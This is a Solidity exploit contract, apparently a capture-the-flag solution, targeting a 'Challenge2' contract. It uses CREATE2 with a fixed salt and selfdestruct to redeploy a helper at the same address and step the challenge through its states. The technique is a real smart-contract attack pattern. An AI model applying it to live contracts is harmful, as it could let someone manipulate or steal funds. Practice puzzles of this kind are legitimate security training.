// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "./Challenge2.sol";
import "hardhat/console.sol";

contract Exploit {
    Challenge2 public immutable instance;
    bool called = false;

    constructor(Challenge2 _instance) payable {
        instance = _instance;
    }

    function finalize() external {
        bytes memory bytecode = type(Caller).creationCode;
        bytecode = abi.encodePacked(bytecode, abi.encode(address(instance)));

        address caller = createContract(bytecode, 0);

        Caller(payable(caller)).second();

        console.log("STATE", uint8(instance.state()));

        Caller(payable(caller)).kill();

        console.log("KILLED");
    }

    function finalize2() external {
        bytes memory bytecode = type(Caller).creationCode;
        bytecode = abi.encodePacked(bytecode, abi.encode(address(instance)));

        address caller = createContract(bytecode, 0);

        console.log("STATE", uint8(instance.state()));

        Caller(payable(caller)).fourth();

        console.log("STATE", uint8(instance.state()));
    }

    function createContract(bytes memory bytecode, uint256 salt)
        public
        returns (address)
    {
        address addr;
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }
        return addr;
    }

    receive() external payable {}
}

contract Caller is ICalled {
    Challenge2 public immutable instance;
    bool called = false;

    constructor(Challenge2 _instance) {
        instance = _instance;

        console.log("INSTANCE", address(_instance));
        console.log("WINNER", _instance.winner());
        console.log("THIS", address(this));

        try _instance.third() {
            called = true;
        } catch {
            _instance.first();
        }

        console.log("STATE", uint8(_instance.state()));
    }

    function second() external {
        instance.second();
    }

    function fourth() external {
        instance.fourth();
    }

    function sup() external override returns (uint256) {
        console.log("SUP");
        if (called) {
            return 1337;
        } else {
            return 80085;
        }
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }

    receive() external payable {}
}
